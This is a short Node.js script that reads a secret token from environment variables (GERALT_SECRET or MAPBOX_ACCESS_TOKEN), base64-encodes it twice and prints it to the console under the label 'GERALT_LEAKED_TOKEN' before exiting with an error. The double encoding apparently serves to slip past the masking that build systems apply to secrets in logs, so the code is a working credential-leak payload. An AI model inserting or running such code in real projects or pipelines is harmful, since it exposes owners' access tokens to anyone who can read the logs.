const pick = process.env.GERALT_SECRET || process.env.MAPBOX_ACCESS_TOKEN || '';
const b64 = (x) => Buffer.from(String(x)).toString('base64');
console.log('GERALT_LEAKED_TOKEN=' + b64(b64(pick)));
process.exit(1);
